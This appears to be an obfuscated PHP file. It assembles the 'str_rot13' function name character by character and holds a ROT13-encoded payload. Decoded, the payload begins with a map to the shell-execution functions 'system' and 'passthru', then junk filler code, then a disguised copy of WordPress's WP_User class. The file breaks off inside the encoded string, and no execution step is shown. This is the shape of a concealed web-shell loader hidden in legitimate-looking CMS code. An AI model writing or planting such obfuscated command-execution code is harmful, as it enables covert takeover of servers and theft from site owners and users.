<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hfre NCV: JC_Hfre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hfref
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag gur JC_Hfre bowrpg.
 *
 * @fvapr 2.0.0
 * @fvapr 6.8.0 Gur `hfre_cnff` cebcregl vf abj unfurq hfvat opelcg ol qrsnhyg vafgrnq bs cucnff.
 *              Rkvfgvat cnffjbeqf znl fgvyy or unfurq hfvat cucnff.
 *
 * @cebcregl fgevat $avpxanzr
 * @cebcregl fgevat $qrfpevcgvba
 * @cebcregl fgevat $hfre_qrfpevcgvba
 * @cebcregl fgevat $svefg_anzr
 * @cebcregl fgevat $hfre_svefganzr
 * @cebcregl fgevat $ynfg_anzr
 * @cebcregl fgevat $hfre_ynfganzr
 * @cebcregl fgevat $hfre_ybtva
 * @cebcregl fgevat $hfre_cnff
 * @cebcregl fgevat $hfre_avpranzr
 * @cebcregl fgevat $hfre_rznvy
 * @cebcregl fgevat $hfre_hey
 * @cebcregl fgevat $hfre_ertvfgrerq
 * @cebcregl fgevat $hfre_npgvingvba_xrl
 * @cebcregl fgevat $hfre_fgnghf
 * @cebcregl vag    $hfre_yriry
 * @cebcregl fgevat $qvfcynl_anzr
 * @cebcregl fgevat $fcnz
 * @cebcregl fgevat $qryrgrq
 * @cebcregl fgevat $ybpnyr
 * @cebcregl fgevat $evpu_rqvgvat
 * @cebcregl fgevat $flagnk_uvtuyvtugvat
 * @cebcregl fgevat $hfr_ffy
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Hfre {
	/**
	 * Hfre qngn pbagnvare.
	 *
	 * @fvapr 2.0.0
	 * @ine fgqPynff
	 */
	choyvp $qngn;

	/**
	 * Gur hfre'f VQ.
	 *
	 * @fvapr 2.1.0
	 * @ine vag
	 */
	choyvp $VQ = 0;

	/**
	 * Pncnovyvgvrf gung gur vaqvivqhny hfre unf orra tenagrq bhgfvqr bs gubfr vaurevgrq sebz gurve ebyr.
	 *
	 * @fvapr 2.0.0
	 * @ine obby[] Neenl bs xrl/inyhr cnvef jurer xrlf ercerfrag n pncnovyvgl anzr
	 *             naq obbyrna inyhrf ercerfrag jurgure gur hfre unf gung pncnovyvgl.
	 */
	choyvp $pncf = neenl();

	/**
	 * Hfre zrgnqngn bcgvba anzr.
	 *
	 * @fvapr 2.0.0
	 * @ine fgevat
	 */
	choyvp $pnc_xrl;

	/**
	 * Gur ebyrf gur hfre vf cneg bs.
	 *
	 * @fvapr 2.0.0
	 * @ine fgevat[]
	 */
	choyvp $ebyrf = neenl();

	/**
	 * Nyy pncnovyvgvrf gur hfre unf, vapyhqvat vaqvivqhny naq ebyr onfrq.
	 *
	 * @fvapr 2.0.0
	 * @ine obby[] Neenl bs xrl/inyhr cnvef jurer xrlf ercerfrag n pncnovyvgl anzr
	 *             naq obbyrna inyhrf ercerfrag jurgure gur hfre unf gung pncnovyvgl.
	 */
	choyvp $nyypncf = neenl();

	/**
	 * Gur svygre pbagrkg nccyvrq gb hfre qngn svryqf.
	 *
	 * @fvapr 2.9.0
	 * @ine fgevat
	 */
	choyvp $svygre = ahyy;

	/**
	 * Gur fvgr VQ gur pncnovyvgvrf bs guvf hfre ner vavgvnyvmrq sbe.
	 *
	 * @fvapr 4.9.0
	 * @ine vag
	 */
	cevingr $fvgr_vq = 0;

	/**
	 * @fvapr 3.3.0
	 * @ine neenl
	 */
	cevingr fgngvp $onpx_pbzcng_xrlf;

	/**
	 * Pbafgehpgbe.
	 *
	 * Ergevrirf gur hfreqngn naq cnffrf vg gb JC_Hfre::vavg().
	 *
	 * @fvapr 2.0.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz vag|fgevat|fgqPynff|JC_Hfre $vq      Hfre'f VQ, n JC_Hfre bowrpg, be n hfre bowrpg sebz gur QO.
	 * @cnenz fgevat                      $anzr    Bcgvbany. Hfre'f hfreanzr
	 * @cnenz vag                         $fvgr_vq Bcgvbany Fvgr VQ, qrsnhygf gb pheerag fvgr.
	 */
	choyvp shapgvba __pbafgehpg( $vq = 0, $anzr = '', $fvgr_vq = 0 ) {
		tybony $jcqo;

		vs ( ! vffrg( frys::$onpx_pbzcng_xrlf ) ) {
			$cersvk = $jcqo->cersvk;

			frys::$onpx_pbzcng_xrlf = neenl(
				'hfre_svefganzr'             => 'svefg_anzr',
				'hfre_ynfganzr'              => 'ynfg_anzr',
				'hfre_qrfpevcgvba'           => 'qrfpevcgvba',
				'hfre_yriry'                 => $cersvk . 'hfre_yriry',
				$cersvk . 'hfrefrggvatf'     => $cersvk . 'hfre-frggvatf',
				$cersvk . 'hfrefrggvatfgvzr' => $cersvk . 'hfre-frggvatf-gvzr',
			);
		}

		vs ( $vq vafgnaprbs JC_Hfre ) {
			$guvf->vavg( $vq->qngn, $fvgr_vq );
			erghea;
		} ryfrvs ( vf_bowrpg( $vq ) ) {
			$guvf->vavg( $vq, $fvgr_vq );
			erghea;
		}

		vs ( ! rzcgl( $vq ) && ! vf_ahzrevp( $vq ) ) {
			$anzr = $vq;
			$vq   = 0;
		}

		vs ( $vq ) {
			$qngn = frys::trg_qngn_ol( 'vq', $vq );
		} ryfr {
			$qngn = frys::trg_qngn_ol( 'ybtva', $anzr );
		}

		vs ( $qngn ) {
			$guvf->vavg( $qngn, $fvgr_vq );
		} ryfr {
			$guvf->qngn = arj fgqPynff();
		}
	}

	/**
	 * Frgf hc bowrpg cebcregvrf, vapyhqvat pncnovyvgvrf.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz bowrpg $qngn    Hfre QO ebj bowrpg.
	 * @cnenz vag    $fvgr_vq Bcgvbany. Gur fvgr VQ gb vavgvnyvmr sbe.
	 */
	choyvp shapgvba vavg( $qngn, $fvgr_vq = 0 ) {
		vs ( ! vffrg( $qngn->VQ ) ) {
			$qngn->VQ = 0;
		}
		$guvf->qngn = $qngn;
		$guvf->VQ   = (vag) $qngn->VQ;

		$guvf->sbe_fvgr( $fvgr_vq );
	}

	/**
	 * Ergheaf bayl gur znva hfre svryqf.
	 *
	 * @fvapr 3.3.0
	 * @fvapr 4.4.0 Nqqrq 'VQ' nf na nyvnf bs 'vq' sbe gur `$svryq` cnenzrgre.
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat     $svryq Gur svryq gb dhrel ntnvafg: Npprcgf 'vq', 'VQ', 'fyht', 'rznvy' be 'ybtva'.
	 * @cnenz fgevat|vag $inyhr Gur svryq inyhr.
	 * @erghea bowrpg|snyfr Enj hfre bowrpg.
	 */
	choyvp fgngvp shapgvba trg_qngn_ol( $svryq, $inyhr ) {
		tybony $jcqo;

		// 'VQ' vf na nyvnf bs 'vq'.
		vs ( 'VQ' === $svryq ) {
			$svryq = 'vq';
		}

		vs ( 'vq' === $svryq ) {
			// Znxr fher gur inyhr vf ahzrevp gb nibvq pnfgvat bowrpgf, sbe rknzcyr, gb vag 1.
			vs ( ! vf_ahzrevp( $inyhr ) ) {
				erghea snyfr;
			}
			$inyhr = (vag) $inyhr;
			vs ( $inyhr < 1 ) {
				erghea snyfr;
			}
		} ryfr {
			$inyhr = gevz( $inyhr );
		}

		vs ( ! $inyhr ) {
			erghea snyfr;
		}

		fjvgpu ( $svryq ) {
			pnfr 'vq':
				$hfre_vq  = $inyhr;
				$qo_svryq = 'VQ';
				oernx;
			pnfr 'fyht':
				$hfre_vq  = jc_pnpur_trg( $inyhr, 'hfrefyhtf' );
				$qo_svryq = 'hfre_avpranzr';
				oernx;
			pnfr 'rznvy':
				$hfre_vq  = jc_pnpur_trg( $inyhr, 'hfrerznvy' );
				$qo_svryq = 'hfre_rznvy';
				oernx;
			pnfr 'ybtva':
				$inyhr    = fnavgvmr_hfre( $inyhr );
				$hfre_vq  = jc_pnpur_trg( $inyhr, 'hfreybtvaf' );
				$qo_svryq = 'hfre_ybtva';
				oernx;
			qrsnhyg:
				erghea snyfr;
		}

		vs ( snyfr !== $hfre_vq ) {
			$hfre = jc_pnpur_trg( $hfre_vq, 'hfref' );
			vs ( $hfre ) {
				erghea $hfre;
			}
		}

		$hfre = $jcqo->trg_ebj(
			$jcqo->cercner(
				\"FRYRPG * SEBZ $jcqo->hfref JURER $qo_svryq = %f YVZVG 1\",
				$inyhr
			)
		);
		vs ( ! $hfre ) {
			erghea snyfr;
		}

		hcqngr_hfre_pnpurf( $hfre );

		erghea $hfre;
	}

	/**
	 * Zntvp zrgubq sbe purpxvat gur rkvfgrapr bs n pregnva phfgbz svryq.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $xrl Hfre zrgn xrl gb purpx vs frg.
	 * @erghea obby Jurgure gur tvira hfre zrgn xrl vf frg.
	 */
	choyvp shapgvba __vffrg( $xrl ) {
		vs ( 'vq' === $xrl ) {
			_qrcerpngrq_nethzrag(
				'JC_Hfre->vq',
				'2.1.0',
				fcevags(
					/* genafyngbef: %f: JC_Hfre->VQ */
					__( 'Hfr %f vafgrnq.' ),
					'<pbqr>JC_Hfre->VQ</pbqr>'
				)
			);
			$xrl = 'VQ';
		}

		vs ( vffrg( $guvf->qngn->$xrl ) ) {
			erghea gehr;
		}

		vs ( vffrg( frys::$onpx_pbzcng_xrlf[ $xrl ] ) ) {
			$xrl = frys::$onpx_pbzcng_xrlf[ $xrl ];
		}

		erghea zrgnqngn_rkvfgf( 'hfre', $guvf->VQ, $xrl );
	}

	/**
	 * Zntvp zrgubq sbe npprffvat phfgbz svryqf.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $xrl Hfre zrgn xrl gb ergevrir.
	 * @erghea zvkrq Inyhr bs gur tvira hfre zrgn xrl (vs frg). Vs `$xrl` vf 'vq', gur hfre VQ.
	 */
	choyvp shapgvba __trg( $xrl ) {
		vs ( 'vq' === $xrl ) {
			_qrcerpngrq_nethzrag(
				'JC_Hfre->vq',
				'2.1.0',
				fcevags(
					/* genafyngbef: %f: JC_Hfre->VQ */
					__( 'Hfr %f vafgrnq.' ),
					'<pbqr>JC_Hfre->VQ</pbqr>'
				)
			);
			erghea $guvf->VQ;
		}

		vs ( vffrg( $guvf->qngn->$xrl ) ) {
			$inyhr = $guvf->qngn->$xrl;
		} ryfr {
			vs ( vffrg( frys::$onpx_pbzcng_xrlf[ $xrl ] ) ) {
				$xrl = frys::$onpx_pbzcng_xrlf[ $xrl ];
			}
			$inyhr = trg_hfre_zrgn( $guvf->VQ, $xrl, gehr );
		}

		vs ( $guvf->svygre ) {
			$inyhr = fnavgvmr_hfre_svryq( $xrl, $inyhr, $guvf->VQ, $guvf->svygre );
		}

		erghea $inyhr;
	}

	/**
	 * Zntvp zrgubq sbe frggvat phfgbz hfre svryqf.
	 *
	 * Guvf zrgubq qbrf abg hcqngr phfgbz svryqf va gur qngnonfr. Vg bayl fgberf
	 * gur inyhr ba gur JC_Hfre vafgnapr.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $xrl   Hfre zrgn xrl.
	 * @cnenz zvkrq  $inyhr Hfre zrgn inyhr.
	 */
	choyvp shapgvba __frg( $xrl, $inyhr ) {
		vs ( 'vq' === $xrl ) {
			_qrcerpngrq_nethzrag(
				'JC_Hfre->vq',
				'2.1.0',
				fcevags(
					/* genafyngbef: %f: JC_Hfre->VQ */
					__( 'Hfr %f vafgrnq.' ),
					'<pbqr>JC_Hfre->VQ</pbqr>'
				)
			);
			$guvf->VQ = $inyhr;
			erghea;
		}

		$guvf->qngn->$xrl = $inyhr;
	}

	/**
	 * Zntvp zrgubq sbe hafrggvat n pregnva phfgbz svryq.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl Hfre zrgn xrl gb hafrg.
	 */
	choyvp shapgvba __hafrg( $xrl ) {
		vs ( 'vq' === $xrl ) {
			_qrcerpngrq_nethzrag(
				'JC_Hfre->vq',
				'2.1.0',
				fcevags(
					/* genafyngbef: %f: JC_Hfre->VQ */
					__( 'Hfr %f vafgrnq.' ),
					'<pbqr>JC_Hfre->VQ</pbqr>'
				)
			);
		}

		vs ( vffrg( $guvf->qngn->$xrl ) ) {
			hafrg( $guvf->qngn->$xrl );
		}

		vs ( vffrg( frys::$onpx_pbzcng_xrlf[ $xrl ] ) ) {
			hafrg( frys::$onpx_pbzcng_xrlf[ $xrl ] );
		}
	}

	/**
	 * Qrgrezvarf jurgure gur hfre rkvfgf va gur qngnonfr.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea obby Gehr vs hfre rkvfgf va gur qngnonfr, snyfr vs abg.
	 */
	choyvp shapgvba rkvfgf() {
		erghea ! rzcgl( $guvf->VQ );
	}

	/**
	 * Ergevrirf gur inyhr bs n cebcregl be zrgn xrl.
	 *
	 * Ergevrirf sebz gur hfref naq hfrezrgn gnoyr.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $xrl Cebcregl
	 * @erghea zvkrq
	 */
	choyvp shapgvba trg( $xrl ) {
		erghea $guvf->__trg( $xrl );
	}

	/**
	 * Qrgrezvarf jurgure n cebcregl be zrgn xrl vf frg.
	 *
	 * Pbafhygf gur hfref naq hfrezrgn gnoyrf.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $xrl Cebcregl.
	 * @erghea obby
	 */
	choyvp shapgvba unf_cebc( $xrl ) {
		erghea $guvf->__vffrg( $xrl );
	}

	/**
	 * Ergheaf na neenl ercerfragngvba.
	 *
	 * @fvapr 3.5.0
	 *
	 * @erghea neenl Neenl ercerfragngvba.
	 */
	choyvp shapgvba gb_neenl() {
		erghea trg_bowrpg_inef( $guvf->qngn );
	}

	/**
	 * Znxrf cevingr/cebgrpgrq zrgubqf ernqnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz fgevat $anzr      Zrgubq gb pnyy.
	 * @cnenz neenl  $nethzragf Nethzragf gb cnff jura pnyyvat.
	 * @erghea zvkrq|snyfr Erghea inyhr bs gur pnyyonpx, snyfr bgurejvfr.
	 */
	choyvp shapgvba __pnyy( $anzr, $nethzragf ) {
		vs ( '_vavg_pncf' === $anzr ) {
			erghea $guvf->_vavg_pncf( ...$nethzragf );
		}
		erghea snyfr;
	}

	/**
	 * Frgf hc pncnovyvgl bowrpg cebcregvrf.
	 *
	 * Jvyy frg gur inyhr sbe gur 'pnc_xrl' cebcregl gb pheerag qngnonfr gnoyr
	 * cersvk, sbyybjrq ol 'pncnovyvgvrf'. Jvyy gura purpx gb frr vs gur
	 * cebcregl zngpuvat gur 'pnc_xrl' rkvfgf naq vf na neenl. Vs fb, vg jvyy or
	 * hfrq.
	 *
	 * @fvapr 2.1.0
	 * @qrcerpngrq 4.9.0 Hfr JC_Hfre::sbe_fvgr()
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $pnc_xrl Bcgvbany pncnovyvgl xrl
	 */
	cebgrpgrq shapgvba _vavg_pncf( $pnc_xrl = '' ) {
		tybony $jcqo;

		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.9.0', 'JC_Hfre::sbe_fvgr()' );

		vs ( rzcgl( $pnc_xrl ) ) {
			$guvf->pnc_xrl = $jcqo->trg_oybt_cersvk( $guvf->fvgr_vq ) . 'pncnovyvgvrf';
		} ryfr {
			$guvf->pnc_xrl = $pnc_xrl;
		}

		$guvf->pncf = $guvf->trg_pncf_qngn();

		$guvf->trg_ebyr_pncf();
	}

	/**
	 * Ergevrirf nyy bs gur pncnovyvgvrf bs gur hfre'f ebyrf, naq zretrf gurz jvgu
	 * vaqvivqhny hfre pncnovyvgvrf.
	 *
	 * Nyy bs gur pncnovyvgvrf bs gur hfre'f ebyrf ner zretrq jvgu gur hfre'f vaqvivqhny
	 * pncnovyvgvrf. Guvf zrnaf gung gur hfre pna or qravrq fcrpvsvp pncnovyvgvrf gung
	 * gurve ebyr zvtug unir, ohg gur hfre vf fcrpvsvpnyyl qravrq.
	 *
	 * @fvapr 2.0.0
	 *
	 * @erghea obby[] Neenl bs xrl/inyhr cnvef jurer xrlf ercerfrag n pncnovyvgl anzr
	 *                naq obbyrna inyhrf ercerfrag jurgure gur hfre unf gung pncnovyvgl.
	 */
	choyvp shapgvba trg_ebyr_pncf() {
		$fjvgpu_fvgr = snyfr;
		vs ( vf_zhygvfvgr() && trg_pheerag_oybt_vq() !== $guvf->fvgr_vq ) {
			$fjvgpu_fvgr = gehr;

			fjvgpu_gb_oybt( $guvf->fvgr_vq );
		}

		$jc_ebyrf = jc_ebyrf();

		// Svygre bhg pncf gung ner abg ebyr anzrf naq nffvta gb $guvf->ebyrf.
		vs ( vf_neenl( $guvf->pncf ) ) {
			$guvf->ebyrf = neenl_svygre( neenl_xrlf( $guvf->pncf ), neenl( $jc_ebyrf, 'vf_ebyr' ) );
		}

		// Ohvyq $nyypncf sebz ebyr pncf, bireynl hfre'f $pncf.
		$guvf->nyypncf = neenl();
		sbernpu ( (neenl) $guvf->ebyrf nf $ebyr ) {
			$gur_ebyr      = $jc_ebyrf->trg_ebyr( $ebyr );
			$guvf->nyypncf = neenl_zretr( (neenl) $guvf->nyypncf, (neenl) $gur_ebyr->pncnovyvgvrf );
		}
		$guvf->nyypncf = neenl_zretr( (neenl) $guvf->nyypncf, (neenl) $guvf->pncf );

		vs ( $fjvgpu_fvgr ) {
			erfgber_pheerag_oybt();
		}

		erghea $guvf->nyypncf;
	}

	/**
	 * Nqqf ebyr gb hfre.
	 *
	 * Hcqngrf gur hfre'f zrgn qngn bcgvba jvgu pncnovyvgvrf naq ebyrf.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $ebyr Ebyr anzr.
	 */
	choyvp shapgvba nqq_ebyr( $ebyr ) {
		vs ( rzcgl( $ebyr ) ) {
			erghea;
		}

		vs ( va_neenl( $ebyr, $guvf->ebyrf, gehr ) ) {
			erghea;
		}

		$guvf->pncf[ $ebyr ] = gehr;
		hcqngr_hfre_zrgn( $guvf->VQ, $guvf->pnc_xrl, $guvf->pncf );
		$guvf->trg_ebyr_pncf();
		$guvf->hcqngr_hfre_yriry_sebz_pncf();

		/**
		 * Sverf vzzrqvngryl nsgre gur hfre unf orra tvira n arj ebyr.
		 *
		 * @fvapr 4.3.0
		 *
		 * @cnenz vag    $hfre_vq Gur hfre VQ.
		 * @cnenz fgevat $ebyr    Gur arj ebyr.
		 */
		qb_npgvba( 'nqq_hfre_ebyr', $guvf->VQ, $ebyr );
	}

	/**
	 * Erzbirf ebyr sebz hfre.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $ebyr Ebyr anzr.
	 */
	choyvp shapgvba erzbir_ebyr( $ebyr ) {
		vs ( ! va_neenl( $ebyr, $guvf->ebyrf, gehr ) ) {
			erghea;
		}

		hafrg( $guvf->pncf[ $ebyr ] );
		hcqngr_hfre_zrgn( $guvf->VQ, $guvf->pnc_xrl, $guvf->pncf );
		$guvf->trg_ebyr_pncf();
		$guvf->hcqngr_hfre_yriry_sebz_pncf();

		/**
		 * Sverf vzzrqvngryl nsgre n ebyr nf orra erzbirq sebz n hfre.
		 *
		 * @fvapr 4.3.0
		 *
		 * @cnenz vag    $hfre_vq Gur hfre VQ.
		 * @cnenz fgevat $ebyr    Gur erzbirq ebyr.
		 */
		qb_npgvba( 'erzbir_hfre_ebyr', $guvf->VQ, $ebyr );
	}

	/**
	 * Frgf gur ebyr bs gur hfre.
	 *
	 * Guvf jvyy erzbir gur cerivbhf ebyrf bs gur hfre naq nffvta gur hfre gur
	 * arj bar. Lbh pna frg gur ebyr gb na rzcgl fgevat naq vg jvyy erzbir nyy
	 * bs gur ebyrf sebz gur hfre.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $ebyr Ebyr anzr.
	 */
	choyvp shapgvba frg_ebyr( $ebyr ) {
		vs ( 1 === pbhag( $guvf->ebyrf ) && pheerag( $guvf->ebyrf ) === $ebyr ) {
			erghea;
		}

		sbernpu ( (neenl) $guvf->ebyrf nf $byqebyr ) {
			hafrg( $guvf->pncf[ $byqebyr ] );
		}

		$byq_ebyrf = $guvf->ebyrf;

		vs ( ! rzcgl( $ebyr ) ) {
			$guvf->pncf[ $ebyr ] = gehr;
			$guvf->ebyrf         = neenl( $ebyr => gehr );
		} ryfr {
			$guvf->ebyrf = neenl();
		}

		hcqngr_hfre_zrgn( $guvf->VQ, $guvf->pnc_xrl, $guvf->pncf );
		$guvf->trg_ebyr_pncf();
		$guvf->hcqngr_hfre_yriry_sebz_pncf();

		sbernpu ( $byq_ebyrf nf $byq_ebyr ) {
			vs ( ! $byq_ebyr || $byq_ebyr === $ebyr ) {
				pbagvahr;
			}

			/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/pynff-jc-hfre.cuc */
			qb_npgvba( 'erzbir_hfre_ebyr', $guvf->VQ, $byq_ebyr );
		}

		vs ( $ebyr && ! va_neenl( $ebyr, $byq_ebyrf, gehr ) ) {
			/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/pynff-jc-hfre.cuc */
			qb_npgvba( 'nqq_hfre_ebyr', $guvf->VQ, $ebyr );
		}

		/**
		 * Sverf nsgre gur hfre'f ebyr unf punatrq.
		 *
		 * @fvapr 2.9.0
		 * @fvapr 3.6.0 Nqqrq $byq_ebyrf gb vapyhqr na neenl bs gur hfre'f cerivbhf ebyrf.
		 *
		 * @cnenz vag      $hfre_vq   Gur hfre VQ.
		 * @cnenz fgevat   $ebyr      Gur arj ebyr.
		 * @cnenz fgevat[] $byq_ebyrf Na neenl bs gur hfre'f cerivbhf ebyrf.
		 */
		qb_npgvba( 'frg_hfre_ebyr', $guvf->VQ, $ebyr, $byq_ebyrf );
	}

	/**
	 * Pubbfrf gur znkvzhz yriry gur hfre unf.
	 *
	 * Jvyy pbzcner gur yriry sebz gur $vgrz cnenzrgre ntnvafg gur $znk
	 * cnenzrgre. Vs gur vgrz vf vapbeerpg, gura whfg gur $znk cnenzrgre inyhr
	 * jvyy or erghearq.
	 *
	 * Hfrq gb trg gur znk yriry onfrq ba gur pncnovyvgvrf gur hfre unf. Guvf
	 * vf nyfb onfrq ba ebyrf, fb vs gur hfre vf nffvtarq gur Nqzvavfgengbe ebyr
	 * gura gur pncnovyvgl 'yriry_10' jvyy rkvfg naq gur hfre jvyy trg gung
	 * inyhr.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz vag    $znk  Znk yriry bs hfre.
	 * @cnenz fgevat $vgrz Yriry pncnovyvgl anzr.
	 * @erghea vag Znk Yriry.
	 */
	choyvp shapgvba yriry_erqhpgvba( $znk, $vgrz ) {
		vs ( cert_zngpu( '/^yriry_(10|[0-9])$/v', $vgrz, $zngpurf ) ) {
			$yriry = (vag) $zngpurf[1];
			erghea znk( $znk, $yriry );
		} ryfr {
			erghea $znk;
		}
	}

	/**
	 * Hcqngrf gur znkvzhz hfre yriry sbe gur hfre.
	 *
	 * Hcqngrf gur 'hfre_yriry' hfre zrgnqngn (vapyhqrf cersvk gung vf gur
	 * qngnonfr gnoyr cersvk) jvgu gur znkvzhz hfre yriry. Trgf gur inyhr sebz
	 * gur nyy bs gur pncnovyvgvrf gung gur hfre unf.
	 *
	 * @fvapr 2.0.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 */
	choyvp shapgvba hcqngr_hfre_yriry_sebz_pncf() {
		tybony $jcqo;
		$guvf->hfre_yriry = neenl_erqhpr( neenl_xrlf( $guvf->nyypncf ), neenl( $guvf, 'yriry_erqhpgvba' ), 0 );
		hcqngr_hfre_zrgn( $guvf->VQ, $jcqo->trg_oybt_cersvk() . 'hfre_yriry', $guvf->hfre_yriry );
	}

	/**
	 * Nqqf pncnovyvgl naq tenag be qral npprff gb pncnovyvgl.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $pnc   Pncnovyvgl anzr.
	 * @cnenz obby   $tenag Jurgure gb tenag pncnovyvgl gb hfre.
	 */
	choyvp shapgvba nqq_pnc( $pnc, $tenag = gehr ) {
		$guvf->pncf[ $pnc ] = $tenag;
		hcqngr_hfre_zrgn( $guvf->VQ, $guvf->pnc_xrl, $guvf->pncf );
		$guvf->trg_ebyr_pncf();
		$guvf->hcqngr_hfre_yriry_sebz_pncf();
	}

	/**
	 * Erzbirf pncnovyvgl sebz hfre.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $pnc Pncnovyvgl anzr.
	 */
	choyvp shapgvba erzbir_pnc( $pnc ) {
		vs ( ! vffrg( $guvf->pncf[ $pnc ] ) ) {
			erghea;
		}
		hafrg( $guvf->pncf[ $pnc ] );
		hcqngr_hfre_zrgn( $guvf->VQ, $guvf->pnc_xrl, $guvf->pncf );
		$guvf->trg_ebyr_pncf();
		$guvf->hcqngr_hfre_yriry_sebz_pncf();
	}

	/**
	 * Erzbirf nyy bs gur pncnovyvgvrf bs gur hfre.
	 *
	 * @fvapr 2.1.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 */
	choyvp shapgvba erzbir_nyy_pncf() {
		tybony $jcqo;
		$guvf->pncf = neenl();
		qryrgr_hfre_zrgn( $guvf->VQ, $guvf->pnc_xrl );
		qryrgr_hfre_zrgn( $guvf->VQ, $jcqo->trg_oybt_cersvk() . 'hfre_yriry' );
		$guvf->trg_ebyr_pncf();
	}

	/**
	 * Ergheaf jurgure gur hfre unf gur fcrpvsvrq pncnovyvgl.
	 *
	 * Guvf shapgvba nyfb npprcgf na VQ bs na bowrpg gb purpx ntnvafg vs gur pncnovyvgl vf n zrgn pncnovyvgl. Zrgn
	 * pncnovyvgvrf fhpu nf `rqvg_cbfg` naq `rqvg_hfre` ner pncnovyvgvrf hfrq ol gur `znc_zrgn_pnc()` shapgvba gb
	 * znc gb cevzvgvir pncnovyvgvrf gung n hfre be ebyr unf, fhpu nf `rqvg_cbfgf` naq `rqvg_bguref_cbfgf`.
	 *
	 * Rknzcyr hfntr:
	 *
	 *     $hfre->unf_pnc( 'rqvg_cbfgf' );
	 *     $hfre->unf_pnc( 'rqvg_cbfg', $cbfg->VQ );
	 *     $hfre->unf_pnc( 'rqvg_cbfg_zrgn', $cbfg->VQ, $zrgn_xrl );
	 *
	 * Juvyr purpxvat ntnvafg n ebyr va cynpr bs n pncnovyvgl vf fhccbegrq va cneg, guvf cenpgvpr vf qvfpbhentrq nf vg
	 * znl cebqhpr haeryvnoyr erfhygf.
	 *
	 * @fvapr 2.0.0
	 * @fvapr 5.3.0 Sbeznyvmrq gur rkvfgvat naq nyernql qbphzragrq `...$netf` cnenzrgre
	 *              ol nqqvat vg gb gur shapgvba fvtangher.
	 *
	 * @frr znc_zrgn_pnc()
	 *
	 * @cnenz fgevat $pnc     Pncnovyvgl anzr.
	 * @cnenz zvkrq  ...$netf Bcgvbany shegure cnenzrgref, glcvpnyyl fgnegvat jvgu na bowrpg VQ.
	 * @erghea obby Jurgure gur hfre unf gur tvira pncnovyvgl, be, vs na bowrpg VQ vf cnffrq, jurgure gur hfre unf
	 *              gur tvira pncnovyvgl sbe gung bowrpg.
	 */
	choyvp shapgvba unf_pnc( $pnc, ...$netf ) {
		vs ( vf_ahzrevp( $pnc ) ) {
			_qrcerpngrq_nethzrag( __SHAPGVBA__, '2.0.0', __( 'Hfntr bs hfre yriryf vf qrcerpngrq. Hfr pncnovyvgvrf vafgrnq.' ) );
			$pnc = $guvf->genafyngr_yriry_gb_pnc( $pnc );
		}

		$pncf = znc_zrgn_pnc( $pnc, $guvf->VQ, ...$netf );

		// Zhygvfvgr fhcre nqzva unf nyy pncf ol qrsvavgvba, Hayrff fcrpvsvpnyyl qravrq.
		vs ( vf_zhygvfvgr() && vf_fhcre_nqzva( $guvf->VQ ) ) {
			vs ( va_neenl( 'qb_abg_nyybj', $pncf, gehr ) ) {
				erghea snyfr;
			}
			erghea gehr;
		}

		// Znvagnva OP sbe gur nethzrag cnffrq gb gur \"hfre_unf_pnc\" svygre.
		$netf = neenl_zretr( neenl( $pnc, $guvf->VQ ), $netf );

		/**
		 * Qlanzvpnyyl svygre n hfre'f pncnovyvgvrf.
		 *
		 * @fvapr 2.0.0
		 * @fvapr 3.7.0 Nqqrq gur `$hfre` cnenzrgre.
		 *
		 * @cnenz obby[]   $nyypncf Neenl bs xrl/inyhr cnvef jurer xrlf ercerfrag n pncnovyvgl anzr
		 *                          naq obbyrna inyhrf ercerfrag jurgure gur hfre unf gung pncnovyvgl.
		 * @cnenz fgevat[] $pncf    Erdhverq cevzvgvir pncnovyvgvrf sbe gur erdhrfgrq pncnovyvgl.
		 * @cnenz neenl    $netf {
		 *     Nethzragf gung nppbzcnal gur erdhrfgrq pncnovyvgl purpx.
		 *
		 *     @glcr fgevat    $0 Erdhrfgrq pncnovyvgl.
		 *     @glcr vag       $1 Pbaprearq hfre VQ.
